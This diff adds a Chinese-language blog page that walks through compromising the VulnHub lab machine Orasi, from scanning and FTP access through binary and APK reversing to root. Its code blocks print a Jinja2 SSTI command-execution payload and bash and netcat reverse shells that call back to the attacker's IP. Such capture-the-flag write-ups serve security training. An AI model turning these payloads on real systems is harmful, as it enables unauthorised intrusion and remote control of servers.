@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vulnhub靶机Orasi - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&family=Albert+Sans:wght@400;500;600&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&family=Albert+Sans:wght@400;500;600&display=swap"></noscript>
+<link rel="stylesheet" href="../assets/style.css" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="../assets/style.css"></noscript>
+</head>
+<body>
+<div class="mk-scanline"></div>
+<div class="mk-container">
+
+<div class="mk-brand fade-up">
+  <span class="mk-mark"></span>
+  <span class="mk-wordmark">// HIMOBRINE</span>
+</div>
+
+<div id="mkNavSentinel"></div>
+
+<div class="mk-nav-wrap" id="mkNavWrap">
+  <nav class="mk-nav">
+    <a href="../index.html" class="mk-nav-link">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析" class="mk-nav-link">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具" class="mk-nav-link">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记" class="mk-nav-link">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向" class="mk-nav-link">逆向</a>
+    <a href="../tags/list.html?tag=调试" class="mk-nav-link">调试</a>
+    <a href="../tags/list.html" class="mk-nav-link">标签归档</a>
+  </nav>
+</div>
+
+<a href="../index.html" class="mk-back-link">[ &larr; ] BACK TO HOME</a>
+
+<article class="mk-bento-tile">
+  <div class="mk-post-date">2024 // 02 / 15</div>
+  <div class="mk-post-title">vulnhub靶机Orasi</div>
+  <div class="mk-post-tags">
+    <a href="../tags/list.html?tag=vulnhub" class="mk-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="mk-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</a>
+  </div>
+
+  <div class="mk-post-content" >
+
+    <nav class="mk-toc">
+      <span class="mk-toc-title">// 目录</span>
+      <ul>
+        <li class="toc-h4"><a href="#info">信息收集</a></li>
+        <li class="toc-h5"><a href="#host">主机发现</a></li>
+        <li class="toc-h5"><a href="#port">端口扫描</a></li>
+        <li class="toc-h5"><a href="#service">端口服务扫描</a></li>
+        <li class="toc-h5"><a href="#vuln-scan">漏洞扫描</a></li>
+        <li class="toc-h4"><a href="#web">Web服务</a></li>
+        <li class="toc-h4"><a href="#ftp">FTP匿名登录</a></li>
+        <li class="toc-h4"><a href="#reverse">逆向分析</a></li>
+        <li class="toc-h4"><a href="#ssti">SSTI注入获取Shell</a></li>
+        <li class="toc-h4"><a href="#privesc">提权</a></li>
+        <li class="toc-h5"><a href="#info2">信息收集</a></li>
+        <li class="toc-h5"><a href="#apk">APK逆向分析</a></li>
+        <li class="toc-h5"><a href="#final">获取root</a></li>
+      </ul>
+    </nav>
+
+    <p>下载地址：<a href="https://download.vulnhub.com/orasi/Orasi.ova">https://download.vulnhub.com/orasi/Orasi.ova</a></p>
+
+    <h4 id="info">信息收集</h4>
+
+    <h5 id="host">主机发现</h5>
+    <p><img loading="lazy" src="../assets/oa_image001.png" alt="主机发现"></p>
+    <p>目标157</p>
+
+    <h5 id="port">端口扫描</h5>
+    <p><img loading="lazy" src="../assets/oa_image002.png" alt="端口扫描"></p>
+
+    <h5 id="service">端口服务扫描</h5>
+    <p><img loading="lazy" src="../assets/oa_image003.png" alt="端口服务扫描"></p>
+
+    <h5 id="vuln-scan">漏洞扫描</h5>
+    <p><img loading="lazy" src="../assets/oa_image004.png" alt="漏洞扫描"></p>
+    <p><img loading="lazy" src="../assets/oa_image005.png" alt="漏洞扫描2"></p>
+
+    <h4 id="web">Web服务</h4>
+    <p>访问80和5000端口：</p>
+    <p><img loading="lazy" src="../assets/oa_image006.png" alt="80端口"></p>
+    <p><img loading="lazy" src="../assets/oa_image007.png" alt="5000端口"></p>
+    <p>看到有网站先去简单爆破一下：</p>
+    <p><img loading="lazy" src="../assets/oa_image008.png" alt="目录爆破"></p>
+    <p>啥都没有目前只能去看看ftp（有匿名登入）</p>
+
+    <h4 id="ftp">FTP匿名登录</h4>
+    <p><img loading="lazy" src="../assets/oa_image009.png" alt="FTP匿名登录"></p>
+    <p>看到文件就直接下：</p>
+    <p><img loading="lazy" src="../assets/oa_image010.png" alt="下载文件1"></p>
+    <p><img loading="lazy" src="../assets/oa_image011.png" alt="下载文件2"></p>
+    <p>可执行文件</p>
+
+    <h4 id="reverse">逆向分析</h4>
+    <p>先跑一下看看：</p>
+    <p><img loading="lazy" src="../assets/oa_image012.png" alt="运行文件1"></p>
+    <p><img loading="lazy" src="../assets/oa_image013.png" alt="运行文件2"></p>
+    <p>感觉要逆向了，上ida：</p>
+    <p><img loading="lazy" src="../assets/oa_image014.png" alt="IDA分析"></p>
+    <p>Mov ptr看到一下字符串 /sh4d0w$s，这个有点像url加上去看看（有两个端口）：</p>
+    <p><img loading="lazy" src="../assets/oa_image015.png" alt="访问路径"></p>
+    <p>好的访问进去了，接下来需要爆破参数了：</p>
+    <p><img loading="lazy" src="../assets/oa_image016.png" alt="参数爆破"></p>
+    <p>有点尴尬，没出来，但是我想到了index上面一段奇怪的东东，应该有用：</p>
+    <p><img loading="lazy" src="../assets/oa_image017.png" alt="奇怪字符"></p>
+    <p>看着像crunch的命令格式，直接跑一下：</p>
+    <p><img loading="lazy" src="../assets/oa_image018.png" alt="crunch命令"></p>
+    <p>嘶没错，那就这个是字典了：</p>
+    <p><img loading="lazy" src="../assets/oa_image019.png" alt="字典跑完"></p>
+    <p><img loading="lazy" src="../assets/oa_image020.png" alt="成功"></p>
+    <p>Ok出来了，接下来就是漏洞问题了：</p>
+    <p><img loading="lazy" src="../assets/oa_image021.png" alt="发现SSTI"></p>
+    <p>感觉有点像传入值=输出值，前面查出来了服务的版本，先去看看有没有洞：</p>
+    <p><img loading="lazy" src="../assets/oa_image022.png" alt="版本信息"></p>
+
+    <h4 id="ssti">SSTI注入获取Shell</h4>
+    <p>使用模板：</p>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">jinja2 SSTI payload</span>
+      </div>
+      <pre><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('id').read()&#125;&#125;</code></pre>
+    </div>
+    <p><img loading="lazy" src="../assets/oa_image023.png" alt="SSTI成功"></p>
+    <p>成功了，接下来就是反弹shell（要编码）：</p>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">bash</span>
+      </div>
+      <pre><code>bash -i >& /dev/tcp/192.168.21.131/666 0>&1</code></pre>
+    </div>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">SSTI payload</span>
+      </div>
+      <pre><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('nc -e /bin/bash 192.168.21.131 666 sh').read()&#125;&#125;</code></pre>
+    </div>
+    <p><img loading="lazy" src="../assets/oa_image024.png" alt="反弹shell成功"></p>
+    <p>成功，用python优化一下shell：</p>
+    <p><img loading="lazy" src="../assets/oa_image025.png" alt="python优化shell"></p>
+
+    <h4 id="privesc">提权</h4>
+
+    <h5 id="info2">信息收集</h5>
+    <p><img loading="lazy" src="../assets/oa_image026.png" alt="信息收集1"></p>
+    <p><img loading="lazy" src="../assets/oa_image027.png" alt="信息收集2"></p>
+    <p><img loading="lazy" src="../assets/oa_image028.png" alt="信息收集3"></p>
+    <p>发现好东西，看一下这个文件：</p>
+    <p><img loading="lazy" src="../assets/oa_image029.png" alt="查看文件"></p>
+    <p>这里有exec：</p>
+    <p><img loading="lazy" src="../assets/oa_image030.png" alt="exec文件"></p>
+    <p><img loading="lazy" src="../assets/oa_image031.png" alt="文件分析"></p>
+    <p>接着信息收集：</p>
+    <p><img loading="lazy" src="../assets/oa_image032.png" alt="信息收集4"></p>
+
+    <h5 id="apk">APK逆向分析</h5>
+    <p>下载apk文件：</p>
+    <p><img loading="lazy" src="../assets/oa_image033.png" alt="查看apk"></p>
+    <p>无法访问，需要复制文件过去：</p>
+    <p><img loading="lazy" src="../assets/oa_image034.png" alt="无法访问"></p>
+    <p><img loading="lazy" src="../assets/oa_image035.png" alt="复制文件1"></p>
+    <p>权限不够，需要写入权限：</p>
+    <p><img loading="lazy" src="../assets/oa_image036.png" alt="权限不够"></p>
+    <p><img loading="lazy" src="../assets/oa_image037.png" alt="修改权限1"></p>
+    <p>目标文件缺少777：</p>
+    <p><img loading="lazy" src="../assets/oa_image038.png" alt="修改权限2"></p>
+    <p>接下来进行复制：</p>
+    <p><img loading="lazy" src="../assets/oa_image039.png" alt="复制文件2"></p>
+    <p><img loading="lazy" src="../assets/oa_image040.png" alt="复制成功"></p>
+    <p>接下来就是逆向了，使用jadx工具：</p>
+    <p><img loading="lazy" src="../assets/oa_image041.png" alt="jadx分析"></p>
+    <p>遇事不决搜索密码：</p>
+    <p><img loading="lazy" src="../assets/oa_image042.png" alt="搜索密码"></p>
+    <p><img loading="lazy" src="../assets/oa_image043.png" alt="密码相关1"></p>
+    <p><img loading="lazy" src="../assets/oa_image044.png" alt="密码相关2"></p>
+    <p>发现这里应该有问题，下面密码生成的方式的解析：</p>
+    <p><img loading="lazy" src="../assets/oa_image045.png" alt="密码生成解析"></p>
+    <p>密码应该是 eye.of.the.tiger.()</p>
+    <p>尝试登入：</p>
+    <p><img loading="lazy" src="../assets/oa_image046.png" alt="尝试登录"></p>
+    <p>密码错了？官方下载地址有提示：</p>
+    <p><img loading="lazy" src="../assets/oa_image047.png" alt="提示"></p>
+    <p>试一下就出来了：</p>
+    <p><img loading="lazy" src="../assets/oa_image048.png" alt="成功登录"></p>
+    <p><img loading="lazy" src="../assets/oa_image049.png" alt="信息收集5"></p>
+
+    <h5 id="final">获取root</h5>
+    <p>重点不在历史主要是sudo，有权限先跑一下咯：</p>
+    <p><img loading="lazy" src="../assets/oa_image050.png" alt="sudo权限"></p>
+    <p>Hex编码：</p>
+    <p><img loading="lazy" src="../assets/oa_image051.png" alt="HEX编码"></p>
+    <p>Exec知道怎么弄了，直接16进制编码：</p>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">python</span>
+      </div>
+      <pre><code>import os;os.system("/bin/bash -i");</code></pre>
+    </div>
+    <p><img loading="lazy" src="../assets/oa_image052.png" alt="HEX编码工具"></p>
+    <p><img loading="lazy" src="../assets/oa_image053.png" alt="再次尝试"></p>
+    <p><img loading="lazy" src="../assets/oa_image054.png" alt="成功"></p>
+    <p>搞定！</p>
+    <p><img loading="lazy" src="../assets/oa_image055.png" alt="结束"></p>
+
+  </div>
+</article>
+
+<footer class="mk-footer">
+  <div class="mk-footer-brand"> RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG </div>
+  <div class="mk-footer-motto">&gt; 道可道，非常道，名可名，非常名</div>
+  <div class="mk-footer-links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="mk-footer-copy">(c) 2026 // SECURITY BLOG</div></footer>
+
+<div class="mk-themedock" id="mkThemeDock">
+  <span class="mk-themedock-item active" data-theme="black">■</span>
+  <span class="mk-themedock-item" data-theme="white">□</span>
+  <span class="mk-themedock-item" data-theme="elysia">◇</span>
+  <span class="mk-themedock-item" data-theme="rei">▽</span>
+</div>
+
+<div class="mk-float-buttons">
+  <button class="mk-float-btn" id="mkThemeToggle" title="切换主题" aria-label="切换主题">■</button>
+  <button class="mk-float-btn" id="mkBackToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const tocLinks = document.querySelectorAll('.mk-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+document.querySelectorAll('.mk-post-content pre').forEach(pre => {
+  const wrap = document.createElement('div');
+  wrap.className = 'mk-code-wrap';
+  pre.parentNode.insertBefore(wrap, pre);
+  wrap.appendChild(pre);
+
+  const lines = pre.textContent.split('\n').length;
+
+  const header = document.createElement('div');
+  header.className = 'mk-code-header';
+
+  const info = document.createElement('span');
+  info.className = 'mk-code-info';
+  info.textContent = `CODE // ${lines} line${lines === 1 ? '' : 's'}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'mk-code-actions';
+
+  const copy = document.createElement('button');
+  copy.className = 'mk-code-btn mk-code-btn-copy'; copy.textContent = 'copy';
+  copy.onclick = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(pre.textContent).then(() => {
+      copy.textContent = 'copied!'; copy.classList.add('copied');
+      setTimeout(() => { copy.textContent = 'copy'; copy.classList.remove('copied'); }, 1500);
+    });
+  };
+
+  const fold = document.createElement('button');
+  fold.className = 'mk-code-btn mk-code-btn-fold'; fold.textContent = '\u2191';
+  fold.onclick = (e) => {
+    e.stopPropagation();
+    wrap.classList.toggle('collapsed');
+    fold.textContent = wrap.classList.contains('collapsed') ? '\u2193' : '\u2191';
+  };
+  wrap.onclick = () => {
+    if (wrap.classList.contains('collapsed')) {
+      wrap.classList.remove('collapsed');
+      fold.textContent = '\u2191';
+    }
+  };
+
+  if (lines > 10) { wrap.classList.add('collapsed'); fold.textContent = '\u2193'; }
+
+  actions.append(copy, fold);
+  header.append(info, actions);
+  wrap.prepend(header);
+});
+</script>
+
+<div class="mk-graph-sidebar" id="mkGraphSidebar">
+  <div class="mk-graph-title"><a href="../graph.html">// 关系图谱</a></div>
+  <div id="graphContainer"></div>
+</div><script>
+(function(){
+var gs=document.getElementById("mkGraphSidebar"),gc=document.getElementById("graphContainer");
+if(!gs||!gc)return;
+var s=document.createElement("script");
+s.src="../assets/vis-network.min.js";
+s.onload=function(){
+  var d=document.createElement("script");
+  d.src="../assets/posts-data.js";
+  d.onload=function(){
+    var p=document.createElement("script");
+    p.textContent="const POSTS=POSTS_DATA.map(function(p){return{title:p.title,date:p.date,url:p.url.replace(\"posts/\",\"\"),excerpt:p.excerpt,tags:p.tags,primary:p.primary,secondary:p.secondary};});";
+    document.body.appendChild(p);
+    var g=document.createElement("script");
+    g.src="../assets/graph.js";
+    document.body.appendChild(g);
+  };
+  document.body.appendChild(d);
+};
+document.body.appendChild(s);
+})();
+</script>
+<script src="../assets/common.js"></script>
+
+</body>
+</html>
